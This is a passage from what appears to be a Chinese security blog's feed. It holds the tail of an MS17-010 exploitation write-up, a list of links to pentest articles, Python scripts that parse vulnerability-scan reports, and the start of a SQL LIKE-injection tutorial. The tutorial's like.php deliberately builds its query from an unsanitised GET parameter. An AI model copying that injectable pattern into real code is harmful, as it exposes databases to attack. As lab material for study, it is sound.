class="line">run</span><br></pre></td></tr></table></figure></p><p><img src="/2019/10/09/MS17-010漏洞复现/shell.png" alt></p><p>这里我们就拿下目标主机的shell了</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;KALI:192.168.79.130&lt;/li&gt;
&lt;li&gt;WIN7:192.168.79.128&lt;/li&gt;
&lt;li&gt;WIN2008:192.168.79.128&lt;/li&gt;
&lt;li&gt;Msf&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
    
      <category term="主机漏洞" scheme="http://yoursite.com/tags/%E4%B8%BB%E6%9C%BA%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>文章汇总-2019-08-13</title>
    <link href="http://yoursite.com/2019/08/13/summary-2019-08-13/"/>
    <id>http://yoursite.com/2019/08/13/summary-2019-08-13/</id>
    <published>2019-08-13T12:41:45.000Z</published>
    <updated>2019-08-13T13:49:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>各位客官看这里啦，把之前的一些自己认为好的文章放在这个POST里面啦。相信你能在这里找到干货~</p><a id="more"></a><p>信安之路首发文章：<br><a href="https://mp.weixin.qq.com/s/jVN48BRYb9pECjk9SAuXpA" target="_blank" rel="noopener">★聊一聊SQLMAP在进行sql注入时的整个流程</a><br><a href="https://mp.weixin.qq.com/s/HDMCjRSEPfjasR_TRb_j-A" target="_blank" rel="noopener">★熊海CMS代码审计</a></p><p>SQL注入：<br><a href="https://sherlocz.github.io/2019/06/29/sqlmap-p/" target="_blank" rel="noopener">★聊一聊SQLMAP在进行sql注入时的整个流程</a><br><a href="https://sherlocz.github.io/2019/07/01/%E4%B8%80%E6%AC%A1sql%E6%B3%A8%E5%85%A5bypass%E7%9A%84%E6%80%9D%E8%80%83/" target="_blank" rel="noopener">★一次sql注入bypass的思考</a><br><a href="https://sherlocz.github.io/2019/01/18/killsafedog/" target="_blank" rel="noopener">★对安全狗的一次 FUZZ测试</a><br><a href="https://sherlocz.github.io/2019/07/23/%E6%9F%90dog%E7%9A%84%E4%B8%80%E6%9D%A1%E9%BE%99%E6%9C%8D%E5%8A%A1/" target="_blank" rel="noopener">★某dog的一条龙服务</a><br><a href="https://sherlocz.github.io/2019/07/04/%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93sql%E8%AF%AD%E5%8F%A5%E8%BF%87waf/" target="_blank" rel="noopener">★分块传输sql语句过waf</a><br><a href="https://sherlocz.github.io/2019/04/11/mssql-injection/" target="_blank" rel="noopener">对mssql数据库的一次渗透(报错注入)</a><br><a href="https://sherlocz.github.io/2019/04/16/sqlmap-is-dba/" target="_blank" rel="noopener">★sqlmap –is-dba参数解析</a><br><a href="https://sherlocz.github.io/2019/04/17/sqlmap-checkEnvironment/" target="_blank" rel="noopener">sqlmap-checkEnvironment函数解读</a><br><a href="https://sherlocz.github.io/2019/08/07/sql%E6%B3%A8%E5%85%A5%E4%B9%8Blike%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">sql注入之like注入</a></p><p>代码审计：<br><a href="https://sherlocz.github.io/2019/05/16/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" target="_blank" rel="noopener">★熊海CMS代码审计</a><br><a href="https://sherlocz.github.io/2019/07/22/Discuz-ML-V3-x%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">★Discuz ML V3.x代码注入漏洞分析</a><br><a href="https://sherlocz.github.io/2019/08/01/ucms%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">★ucms系统存在代码注入漏洞的分析</a><br><a href="https://sherlocz.github.io/2019/08/04/zzzphp-V1-6-1-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">★zzzphp V1.6.1 远程代码执行漏洞分析/</a><br><a href="https://sherlocz.github.io/2019/07/05/YxtCMF%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" target="_blank" rel="noopener">YxtCMF后台的注入和getshell分析</a><br><a href="https://sherlocz.github.io/2019/08/06/dedecms-v5-7-sp2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">dedecms v5.7 sp2代码执行漏洞复现</a></p><p>爬虫：<br><a href="https://sherlocz.github.io/2019/06/26/58-spider/" target="_blank" rel="noopener">★58爬虫租房信息(半成品)</a><br><a href="https://sherlocz.github.io/2019/01/21/douyin-spider/" target="_blank" rel="noopener">★爬取抖音遇见方形文字的问题</a><br><a href="https://sherlocz.github.io/2019/01/14/butian-spider/" target="_blank" rel="noopener">爬取补天公益厂商</a><br><a href="https://sherlocz.github.io/2019/04/30/zoomeye-api/" target="_blank" rel="noopener">利用zoomeye API获取查询结果</a><br><a href="https://sherlocz.github.io/2019/08/10/%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E7%9A%84%E7%88%AC%E8%99%AB/" target="_blank" rel="noopener">一次漏洞扫描的爬虫(半成品)</a></p><p>脚本/工具：<br><a href="https://sherlocz.github.io/2019/01/20/caidao/" target="_blank" rel="noopener">★对菜刀原理的分析</a><br><a href="https://sherlocz.github.io/2019/01/09/github-dis/" target="_blank" rel="noopener">★对一款轻量级Github泄露工具的源码分析</a><br><a href="https://sherlocz.github.io/2019/01/11/subdomainbrute/" target="_blank" rel="noopener">★subdomainbrute源码分析(基础篇)</a><br><a href="https://sherlocz.github.io/2019/01/13/subdomainbrute-2/" target="_blank" rel="noopener">subdomainbrute源码分析(进阶篇)(半成品)</a><br><a href="https://sherlocz.github.io/2019/01/29/change-your-pwd/" target="_blank" rel="noopener">用Python修改小姐姐的电脑密码</a><br><a href="https://sherlocz.github.io/2019/01/13/batch-urls/" target="_blank" rel="noopener">编写脚本对大量url进行处理</a><br><a href="https://sherlocz.github.io/2019/01/17/rename-1000/" target="_blank" rel="noopener">批量修改文件名</a></p><p>翻译：<br><a href="https://sherlocz.github.io/2019/07/12/%E8%AF%91%E6%96%87-MySQL-UDF-Exploitation/" target="_blank" rel="noopener">★译文–MySQL UDF Exploitation</a></p><p>Mail:<a href="mailto:799843458@qq.com" target="_blank" rel="noopener">799843458@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;各位客官看这里啦，把之前的一些自己认为好的文章放在这个POST里面啦。相信你能在这里找到干货~&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="汇总" scheme="http://yoursite.com/tags/%E6%B1%87%E6%80%BB/"/>
    
  </entry>
  
  <entry>
    <title>一次漏洞扫描的爬虫</title>
    <link href="http://yoursite.com/2019/08/10/%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E7%9A%84%E7%88%AC%E8%99%AB/"/>
    <id>http://yoursite.com/2019/08/10/一次漏洞扫描的爬虫/</id>
    <published>2019-08-10T08:23:36.000Z</published>
    <updated>2019-08-10T14:54:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近在写漏洞扫描的报告，要从漏扫工具导出的报告中重新编写一份成公司的报告，但是里面东西太多啦~，让我一个一个复制粘贴整理？No！会python的人绝不手动搞~</p><p>PS：这篇文章没有观赏性，纯粹做一个笔记<br><a id="more"></a></p><h1 id="爬取数据"><a href="#爬取数据" class="headerlink" title="爬取数据"></a>爬取数据</h1><p>用python爬取网站的数据，一般的话就是 requests + bs4，但是问题就来了，本地的文件并不能有requests进行请求，而且bs4生成我们的soup对象的时候，只需要我们的html代码，所以我就直接以文件的形式打开了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">htmlf = open(&apos;C:/Users/Administrator/Desktop/export/Document.html&apos;,&apos;r&apos;)</span><br><span class="line">content = htmlf.read()</span><br></pre></td></tr></table></figure></p><p>这样我们的html代码就复制给content。</p><p>然后在写 soup 抓取数据的时候发现抓取不到、编码问题，尝试了半天不行，就去一个python的群里面去请教了一番。。</p><p><img src="/2019/08/10/一次漏洞扫描的爬虫/1.png" alt><br><img src="/2019/08/10/一次漏洞扫描的爬虫/2.png" alt><br><img src="/2019/08/10/一次漏洞扫描的爬虫/3.png" alt><br><img src="/2019/08/10/一次漏洞扫描的爬虫/4.png" alt></p><p>最后大佬们让我不用bs4了，去用xpath,，就去尝试了一下，哦豁，居然还成了~ 开心</p><p><img src="/2019/08/10/一次漏洞扫描的爬虫/5.png" alt></p><p>思路和bs4都是一样的，先生成一个对象，然后利用对象的方法去获取标签里面的内容，这里直接贴上代码和结果：<br><img src="/2019/08/10/一次漏洞扫描的爬虫/6.png" alt></p><p>这里是源文档里面的内容<br><img src="/2019/08/10/一次漏洞扫描的爬虫/7.png" alt></p><p>既然可以抓取，这里我的几个需求是这样的：<br>文档一：统计每一个ip中高危漏洞、中危漏洞、低危漏洞的数量。<br>文档二：爬取每一个漏洞对应的名称、详情、解决方法、参考、CVE编号、CVSS评分涉及IP。</p><h1 id="文档一：统计漏洞数量"><a href="#文档一：统计漏洞数量" class="headerlink" title="文档一：统计漏洞数量"></a>文档一：统计漏洞数量</h1><p>这里的思路很简单，获取每一个ip中扫描出的漏洞对应的等级，一个for循环，然后i++；</p><p>每一个ip的xpath：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/html/body/div[5]/h2[n]/a/text()</span><br></pre></td></tr></table></figure></p><p>获取ip:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">from lxml import etree</span><br><span class="line"></span><br><span class="line">htmlf = open(&apos;C:/Users/Administrator/Desktop/Document.html&apos;,&apos;r&apos;)</span><br><span class="line">content = htmlf.read()</span><br><span class="line"></span><br><span class="line">html = etree.HTML(content)</span><br><span class="line"># print(html)</span><br><span class="line">for i in range(1,70):</span><br><span class="line">ip_xpath = &quot;/html/body/div[5]/h2[&#123;0&#125;]/a/text()&quot;.format(i)</span><br><span class="line">ip = html.xpath(ip_xpath)</span><br><span class="line">print(ip[0])</span><br></pre></td></tr></table></figure></p><p>每一个ip下漏洞等级对应的xpath：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/html/body/div[5]/div[1]/div[2]/table/tbody/tr[2]/td[3]/p</span><br><span class="line">/html/body/div[5]/div[1]/div[2]/table/tbody/tr[3]/td[3]/p</span><br></pre></td></tr></table></figure></p><p>获取每一个ip下的漏洞等级：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">from lxml import etree</span><br><span class="line"></span><br><span class="line">htmlf = open(&apos;C:/Users/Administrator/Desktop/Document.html&apos;,&apos;r&apos;)</span><br><span class="line">content = htmlf.read()</span><br><span class="line"></span><br><span class="line">html = etree.HTML(content)</span><br><span class="line"># print(html)</span><br><span class="line"></span><br><span class="line">high = 0</span><br><span class="line">mid = 0</span><br><span class="line">low = 0</span><br><span class="line">for i in range(2,1000):</span><br><span class="line">level_xpath = &quot;/html/body/div[5]/div[2]/div[2]/table/tbody/tr[&#123;0&#125;]/td[3]/p/text()&quot;.format(i)</span><br><span class="line">try:</span><br><span class="line">level = html.xpath(level_xpath)</span><br><span class="line">if str(level[0].encode(&apos;unicode-escape&apos;)) == &apos;\u9ad8&apos;:</span><br><span class="line"># print(&apos;high&apos;)</span><br><span class="line">high +=1</span><br><span class="line">elif str(level[0].encode(&apos;unicode-escape&apos;)) == &apos;\u4e2d\u7b49&apos;:</span><br><span class="line"># print(&quot;mid&quot;)</span><br><span class="line">mid +=1</span><br><span class="line">elif str(level[0].encode(&apos;unicode-escape&apos;)) == &apos;\u4f4e&apos;:</span><br><span class="line"># print(&apos;low&apos;)</span><br><span class="line">low +=1</span><br><span class="line">except:</span><br><span class="line">pass</span><br><span class="line"></span><br><span class="line">print(high)</span><br><span class="line">print(mid)</span><br><span class="line">print(low)</span><br></pre></td></tr></table></figure></p><p>然后整合在一起：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">from lxml import etree</span><br><span class="line"></span><br><span class="line">htmlf = open(&apos;C:/Users/Administrator/Desktop/Document.html&apos;,&apos;r&apos;)</span><br><span class="line">content = htmlf.read()</span><br><span class="line"></span><br><span class="line">html = etree.HTML(content)</span><br><span class="line"># print(html)</span><br><span class="line"></span><br><span class="line">ip_list = []</span><br><span class="line"></span><br><span class="line">for i in range(1,70):</span><br><span class="line">ip_xpath = &quot;/html/body/div[5]/h2[&#123;0&#125;]/a/text()&quot;.format(i)</span><br><span class="line">ip = html.xpath(ip_xpath)</span><br><span class="line"># print(ip[0])</span><br><span class="line">ip_list.append(ip[0])</span><br><span class="line"></span><br><span class="line"># print(ip_list)</span><br><span class="line">for i in range(1,70):</span><br><span class="line">high = 0</span><br><span class="line">mid = 0</span><br><span class="line">low = 0</span><br><span class="line">ip = ip_list[i-1]</span><br><span class="line">for m in range(2,200):</span><br><span class="line">level_xpath = &quot;/html/body/div[5]/div[&#123;0&#125;]/div[2]/table/tbody/tr[&#123;1&#125;]/td[3]/p/text()&quot;.format(i,m)</span><br><span class="line"># print(level_xpath)</span><br><span class="line">try:</span><br><span class="line">level = html.xpath(level_xpath)</span><br><span class="line">if str(level[0].encode(&apos;unicode-escape&apos;)) == &apos;\u9ad8&apos;:</span><br><span class="line"># print(&apos;high&apos;)</span><br><span class="line">high +=1</span><br><span class="line">elif str(level[0].encode(&apos;unicode-escape&apos;)) == &apos;\u4e2d\u7b49&apos;:</span><br><span class="line"># print(&quot;mid&quot;)</span><br><span class="line">mid +=1</span><br><span class="line">elif str(level[0].encode(&apos;unicode-escape&apos;)) == &apos;\u4f4e&apos;:</span><br><span class="line"># print(&apos;low&apos;)</span><br><span class="line">low +=1</span><br><span class="line">except:</span><br><span class="line">pass</span><br><span class="line">print(&apos;[+]IP: &#123;3&#125; FOUND [HIGH] &#123;0&#125; [MID] &#123;1&#125; [LOW] &#123;2&#125;&apos;).format(high,mid,low,ip)</span><br></pre></td></tr></table></figure></p><p>原谅我的代码写的垃圾 ==</p><p><img src="/2019/08/10/一次漏洞扫描的爬虫/8.png" alt></p><h1 id="文档二：爬取漏洞相关信息"><a href="#文档二：爬取漏洞相关信息" class="headerlink" title="文档二：爬取漏洞相关信息"></a>文档二：爬取漏洞相关信息</h1><p>漏洞分为 关键漏洞、严重漏洞和中等漏洞。</p><p>没啥说的，直接干：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">#关键漏洞信息脚本，其他两个更换div的节点就行了。</span><br><span class="line">#严重漏洞xpath:</span><br><span class="line">from lxml import etree</span><br><span class="line"></span><br><span class="line">htmlf = open(&apos;C:/Users/Administrator/Desktop/export/Document.html&apos;,&apos;r&apos;)</span><br><span class="line">content = htmlf.read()</span><br><span class="line">html = etree.HTML(content)</span><br><span class="line"></span><br><span class="line">for i in range(1,78):</span><br><span class="line">print(&apos;======================================================================&apos;)</span><br><span class="line">Refer_info = &apos;&apos;</span><br><span class="line">try:</span><br><span class="line">#爬取标题和信息</span><br><span class="line">title_xpath = &apos;/html/body/div[4]/div[1]/h3[&#123;0&#125;]/a/text()&apos;.format(i)</span><br><span class="line">title = html.xpath(title_xpath)</span><br><span class="line">detail_xpath = &apos;/html/body/div[4]/div[1]/div[&#123;0&#125;]/div[1]/p/text()&apos;.format(i)</span><br><span class="line">detail = html.xpath(detail_xpath)</span><br><span class="line">print(&quot;[+]title IN VUL[&#123;0&#125;]&quot;.format(i) + &apos;\r&apos; + title[1].strip())</span><br><span class="line">if detail[0].strip() != &quot;&quot;:</span><br><span class="line">print(&apos;[+]DETAIL IN VUL[&#123;0&#125;]&apos;.format(i) + &apos;\r&apos;+ detail[0].strip())</span><br><span class="line">else:</span><br><span class="line">print(&apos;[+]DETAIL IN VUL[&#123;0&#125;]&apos;.format(i) + &apos;\r&apos;+ detail[1].strip())</span><br><span class="line"></span><br><span class="line">#爬取解决办法</span><br><span class="line">solution_xpath = &apos;/html/body/div[4]/div[1]/div[&#123;0&#125;]/div[4]/p[3]//text()&apos;.format(i)</span><br><span class="line">solution = html.xpath(solution_xpath)</span><br><span class="line">solution_info = &quot;&quot;</span><br><span class="line">for M in range(len(solution)):</span><br><span class="line">solution_info = solution_info + solution[M].strip()</span><br><span class="line">if solution_info.strip() == &quot;&quot;:</span><br><span class="line">solution_xpath = &apos;/html/body/div[4]/div[1]/div[&#123;0&#125;]/div[4]/p[2]//text()&apos;.format(i)</span><br><span class="line">solution = html.xpath(solution_xpath)</span><br><span class="line">solution_info = &quot;&quot;</span><br><span class="line">for M in range(len(solution)):</span><br><span class="line">solution_info = solution_info + solution[M].strip()</span><br><span class="line">if solution_info.strip() == &quot;&quot;:</span><br><span class="line">solution_xpath = &quot;/html/body/div[4]/div[1]/div[&#123;0&#125;]/div[4]/div/ul//text()&quot;.format(i)</span><br><span class="line">solution = html.xpath(solution_xpath)</span><br><span class="line"># print(solution)</span><br><span class="line">solution_info = &quot;&quot;</span><br><span class="line">for M in range(len(solution)):</span><br><span class="line">solution_info = solution_info + solution[M].strip()</span><br><span class="line">print(&apos;[+]SOLUTION IN VUL[&#123;0&#125;]&apos;.format(i) + &apos;\r&apos;+solution_info)</span><br><span class="line">#爬取参考</span><br><span class="line">for j in range(2,100):</span><br><span class="line">try:</span><br><span class="line">refer_xpath = &apos;/html/body/div[4]/div[1]/div[&#123;0&#125;]/div[3]/div/table/tbody/tr[&#123;1&#125;]//text()&apos;.format(i,j)</span><br><span class="line">refer = html.xpath(refer_xpath)</span><br><span class="line">refer_info = refer[2].strip() + &quot;:&quot; + refer[6].strip() + refer[8].strip()</span><br><span class="line">Refer_info = Refer_info + refer_info + &apos;\r&apos;</span><br><span class="line">except:</span><br><span class="line">pass</span><br><span class="line">print(&apos;[+]REFER IN VUL[&#123;0&#125;]&apos;.format(i) + &apos;\r&apos;+Refer_info)</span><br><span class="line">except:</span><br><span class="line">pass</span><br><span class="line"></span><br><span class="line">#爬取节点</span><br><span class="line">print(&apos;[+]NODE IN VUL[&#123;0&#125;]&apos;.format(i))</span><br><span class="line">for j in range(2,100):</span><br><span class="line">try:</span><br><span class="line">node_xpath = &apos;/html/body/div[4]/div[1]/div[&#123;0&#125;]/div[2]/div/table/tbody/tr[&#123;1&#125;]/td[1]/p/text()&apos;.format(i,j)</span><br><span class="line">node = html.xpath(node_xpath)</span><br><span class="line">print(node[0].strip())</span><br><span class="line">except:</span><br><span class="line">pass</span><br></pre></td></tr></table></figure></p><p>严重 漏洞<br>中等 漏洞</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在写漏洞扫描的报告，要从漏扫工具导出的报告中重新编写一份成公司的报告，但是里面东西太多啦~，让我一个一个复制粘贴整理？No！会python的人绝不手动搞~&lt;/p&gt;
&lt;p&gt;PS：这篇文章没有观赏性，纯粹做一个笔记&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="爬虫" scheme="http://yoursite.com/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>sql注入之like注入</title>
    <link href="http://yoursite.com/2019/08/07/sql%E6%B3%A8%E5%85%A5%E4%B9%8Blike%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2019/08/07/sql注入之like注入/</id>
    <published>2019-08-07T10:39:32.000Z</published>
    <updated>2019-08-07T11:18:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>今天在实战的过程中遇到了一个mssql的数据库，参数提交在了 <strong>like</strong> 后的参数里面，本地测试注入能成功，但是在实战的时候不晓得后端进行了什么处理，没拿下，哎~~</p><p>很烦，写篇博客纪念一下~</p><a id="more"></a><p>like后面的参数可控导致的注入，也没啥花里胡哨的技巧，原理都是互通的，就是注入方式看起来不一样。</p><p>不想搭建mssql+aspx的环境，就简单点搞mysql的吧~</p><p><img src="/2019/08/07/sql注入之like注入/pre.png" alt></p><p>环境：</p><ul><li>phpstudy2014</li><li>php 5.4</li><li>mysql 5.5.40</li></ul><h1 id="脚本准备"><a href="#脚本准备" class="headerlink" title="脚本准备"></a>脚本准备</h1><p>like.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$like = @$_GET[&apos;like&apos;];</span><br><span class="line"></span><br><span class="line">//id没有做 整形转换</span><br><span class="line">if( !isset($like)|| empty($like) )&#123;</span><br><span class="line">    exit(&apos;get.like 参数不能为空&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try&#123;</span><br><span class="line">    //分别对应的是 地址，端口号，连接的数据库，编码</span><br><span class="line">    $dsn = &quot;mysql:host=127.0.0.1; port=3306; dbname=security; charset=utf8&quot;;</span><br><span class="line"></span><br><span class="line">    //帐号</span><br><span class="line">    $user = &apos;root&apos;;</span><br><span class="line"></span><br><span class="line">    //密码 </span><br><span class="line">    $psw =&apos;root&apos;; </span><br><span class="line"></span><br><span class="line">    //连接到 MySQL</span><br><span class="line">    $pdo = new PDO($dsn,$user,$psw);</span><br><span class="line"></span><br><span class="line">    //准备执行的sql语句  start</span><br><span class="line">    $sql = &quot;select * from users where username like &apos;%$like%&apos;&quot;;</span><br><span class="line">    echo $sql;</span><br><span class="line">    echo &apos;&lt;br/&gt;&apos;;</span><br><span class="line">    //准备执行的sql语句 end</span><br><span class="line">    </span><br><span class="line">    //进行查询数据库出问题则报具体错误</span><br><span class="line">    $res = $pdo-&gt;query($sql) or var_dump($pdo-&gt;errorInfo());</span><br><span class="line"> </span><br><span class="line">    $mon = $res-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class="line">    print_r( $mon );</span><br><span class="line"></span><br><span class="line">&#125; catch (Exception $e) &#123;</span><br><span class="line">    print $e-&gt;getMessage();</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>security.sql<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> Navicat Premium Data Transfer</span><br><span class="line"></span><br><span class="line"> Source Server         : 本地</span><br><span class="line"> Source Server Type    : 